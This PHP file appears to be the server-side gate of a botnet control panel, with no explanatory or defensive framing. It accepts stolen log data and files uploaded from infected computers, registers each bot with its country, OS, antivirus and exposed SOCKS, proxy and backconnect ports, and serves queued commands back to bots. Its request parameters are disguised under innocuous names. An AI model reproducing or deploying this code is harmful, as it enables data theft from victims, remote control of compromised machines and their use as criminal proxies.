<? include_once('system/global.php');
include_once('system/config.php');

define('SRQ_UPLOADLOG',  'btn');  //1
define('SRQ_STAT',       'zip');  //2 
define('SRQ_RCMD',       'cmd');  //3 
define('SRQ_UPLOADFILE', 'fu');   //4

define('SRQ_VERSION',    'name'); //v
define('SRQ_TYPE',       'type'); //n
define('SRQ_PORT_SOCKS', 'id');   //sp
define('SRQ_PORT_LC',    'rdp');  //lcp
define('SRQ_PORT_PROXY', 'ref');  //pr
define('SRQ_REMOTEIP',   'url');  //rip
define('SRQ_BOTNET',     'q');    //i
define('SRQ_SIZE',       'item'); //s
define('SRQ_PATH',       'email');//p

if(!mysql_connect(MYSQL_HOST,MYSQL_USER,MYSQL_PASS)||!mysql_select_db(MYSQL_DB))die();
$bn = isset($_GET[SRQ_BOTNET]) && $_GET[SRQ_BOTNET] != '' ? substr($_GET[SRQ_BOTNET], 0, 4) : DEF_BOTNET;
$rip = isset($_GET[SRQ_REMOTEIP]) && $_GET[SRQ_REMOTEIP] != '' && !strpos($_GET[SRQ_REMOTEIP], '\\') && !strpos($_GET[SRQ_REMOTEIP], '/') ? addslashes(fs($_GET[SRQ_REMOTEIP])) : $_SERVER['REMOTE_ADDR'];

if(isset($_GET[SRQ_UPLOADLOG]) && $_GET[SRQ_UPLOADLOG] != '' && MODULES & MODULE_LOGS && $_SERVER['REQUEST_METHOD'] == 'POST')
{
  $cnt = gcnt();
  if(MODULES & MODULE_LOGS_WFS)
  {
    $file = PATH_LOGS.'/'.$bn.'/'.$cnt;
    if(!createdir($file))die();
    $file .= '/'.fs($_GET[SRQ_UPLOADLOG]).'['.$rip.']';
    if(!($f = fopen($file, 'ab')))die();
    flock($f, LOCK_EX);
    fwrite($f, file_get_contents('php://input'));
    flock($f,LOCK_UN);
    fclose($f);
    header('Soft: OK');
  }
  if(MODULES & MODULE_LOGS_WDB && @include_once('system/fmt.php'))
  {
    $tbl = TABLE_LOGS.'_'.gmdate('ymd',time());
    $tdt = "id int unsigned NOT NULL auto_increment,comp_id tinytext NOT NULL,ip varchar(15) NOT NULL default '0.0.0.0',country varchar(2) NOT NULL default '--',time int unsigned NOT NULL default '0',type tinyint unsigned NOT NULL default '0',proc tinytext NOT NULL,av mediumint unsigned NOT NULL default '0',stime int unsigned NOT NULL default '0',gmt mediumint NOT NULL default '0',os tinytext NOT NULL,tc int unsigned NOT NULL default '0',lng mediumint unsigned NOT NULL default '0',bn varchar(4) NOT NULL default '',log text NOT NULL,PRIMARY KEY(id),KEY id(id)";
    mysql_query('CREATE TABLE IF NOT EXISTS '.$tbl.' ('.$tdt.')');
    if(!Log2SQL($bn, $tbl, fs($_GET[SRQ_UPLOADLOG]), $cnt, $rip, file_get_contents('php://input')))die();
    header('Soft: OK');
  }
  die();
}
else if(isset($_GET[SRQ_STAT]) && $_GET[SRQ_STAT] != '')
{
  $cnt = gcnt();
  $ver = (isset($_GET[SRQ_VERSION]) && is_numeric($_GET[SRQ_VERSION])) ? $_GET[SRQ_VERSION] : 0;
  $in = (isset($_GET[SRQ_TYPE]) && is_numeric($_GET[SRQ_TYPE])) ? $_GET[SRQ_TYPE] : 0;
  $tm = time();
  $q = 'ip=\''.$rip.'\',time=\''.$tm.'\',country=\''.$cnt.'\',bn=\''.addslashes($bn).'\'';
  if($ver > 0)$q .= ($in == 1 ? ',inst=\''.$ver.'\'' : ',up=\''.$ver.'\'');
  $cid = addslashes(fs($_GET[SRQ_STAT]));
  if(MODULES & MODULE_BOTS_SOCKS || MODULES & MODULE_BOTS_PROXY)
  {
    $r = mysql_query('SELECT time,ot FROM '.TABLE_STATS.' WHERE comp_id=\''.$cid.'\' LIMIT 1');
    if($r && mysql_affected_rows() > 0 && ($m = mysql_fetch_row($r)))
    {
      if($m[0] <= ($tm - (OPT_BTONT * 60)) || $m[1] == 0)$q .= ',ot='.$tm;
    }
    
    if(isset($_GET[SRQ_SIZE]) && is_numeric($_GET[SRQ_SIZE]))$q.=',speed=\''.$_GET[SRQ_SIZE].'\'';
    if(isset($_GET[SRQ_PORT_SOCKS]) && is_numeric($_GET[SRQ_PORT_SOCKS]) && MODULES & MODULE_BOTS_SOCKS)$q .= ',socks=\''.$_GET[SRQ_PORT_SOCKS].'\'';
    if(isset($_GET[SRQ_PORT_PROXY]) && is_numeric($_GET[SRQ_PORT_PROXY]) && MODULES & MODULE_BOTS_PROXY)$q .= ',proxy=\''.$_GET[SRQ_PORT_PROXY].'\'';
  }
  if(isset($_GET[SRQ_PORT_LC]) && is_numeric($_GET[SRQ_PORT_LC]) && MODULES & MODULE_BOTS_LC_SS)$q .= ',lc=\''.$_GET[SRQ_PORT_LC].'\'';
  if(!mysql_query('INSERT INTO '.TABLE_STATS.' SET '.$q.',comp_id=\''.$cid.'\',ftime=\''.$tm.'\',ot=\''.$tm.'\'')||mysql_affected_rows()!=1)mysql_query('UPDATE '.TABLE_STATS.' SET '.$q.' WHERE comp_id=\''.$cid.'\' LIMIT 1');
  //mysql_query('INSERT INTO '.TABLE_STATS.' SET '.$q.',comp_id=\''.$cid.'\' ON DUPLICATE KEY UPDATE '.$q);
  header('Soft: OK');
  if(MODULES&MODULE_BOTS_CMDS)
  {
    $cid_=str_replace(array('%','_'),array('\%','\_'),$cid);
    $r=mysql_query('SELECT id,id2,cmds FROM '.TABLE_BCMDS.' WHERE stat=1 AND (lim=0 OR exc<lim) AND ((c=\'\' OR c LIKE BINARY \'%|'.$cnt.'|%\') AND (bns=\'\' OR bns LIKE BINARY \'%|'.$bn.'|%\') AND (comps=\'\' OR comps LIKE BINARY \'%|'.$cid_.'|%\')) AND rcomps NOT LIKE \'%|'.$cid_.'|%\' LIMIT 10');
    if($r&&mysql_affected_rows()>0)while((($m=mysql_fetch_row($r))))
    {
      print pack('SL',strlen($m[2])+4,$m[1]).$m[2];flush();
      mysql_query('UPDATE '.TABLE_BCMDS.' SET exc=exc+1 WHERE id='.$m[0].' LIMIT 1');
    }
  }
}
else if(isset($_GET[SRQ_RCMD]) && $_GET[SRQ_RCMD] != '' && isset($_GET[SRQ_TYPE]) && MODULES & MODULE_BOTS_CMDS)
{
  mysql_query('UPDATE '.TABLE_BCMDS.' SET exct=exct+1,rcomps=CONCAT(rcomps,\'|'.addslashes(fs($_GET[SRQ_RCMD])).'|\') WHERE id2='.addslashes($_GET[SRQ_TYPE]).' LIMIT 1');
  header('Soft: OK');
}
else if(isset($_GET[SRQ_UPLOADFILE]) && $_GET[SRQ_UPLOADFILE] != '' && MODULES & MODULE_LOGS_FILES && @include_once('system/fmt.php'))
{
  $fd = file_get_contents('php://input');
  if(isset($_GET[SRQ_SIZE]) && strlen($fd) != $_GET[SRQ_SIZE])die();
  $file = PATH_LFILES.'/'.$bn.'/'.fs($_GET[SRQ_UPLOADFILE]).'/'.(isset($_GET[SRQ_PATH]) ? fs($_GET[SRQ_PATH]) : 'unknown/'.time());
  $file = str_replace('\\', '/', $file);
  for($i = 0; $i < 9999; $i++)
  {
    $ext = $i == 0 ? '.dat' : '['.$i.'].dat';
    if(!file_exists($file.$ext))
    {
      $file .= $ext;
      if(!createdir(dirname($file)) || !($f = fopen($file,'wb')))die();
      flock($f, LOCK_EX);
      fwrite($f, DecodeBuffer($fd));
      flock($f, LOCK_UN);
      fclose($f);
      header('Soft: OK');
      break;
    }
  }
}
else
{
  /*header("HTTP/1.0 404 Not Found");*/
  die();
}
function fs($s){$s=strtolower($s);$c=strlen($s);for($i=0;$i<$c;$i++)if($s[$i]!='\\'&&$s[$i]!='/'&&$s[$i]!='.'){$h=ord($s[$i]);if(($h>=97&&$h<=122)||($h>=48&&$h<=57));else $s[$i]='_';}return $s;}
function gcnt(){global $rip;$ip=sprintf('%u',ip2long($rip));$r=mysql_query('SELECT c FROM '.TABLE_IP2C.' WHERE l<='.$ip.' AND h>='.$ip.' LIMIT 1');if($r&&mysql_affected_rows()==1){$m=mysql_fetch_row($r);return $m[0];}else return '--';}
?>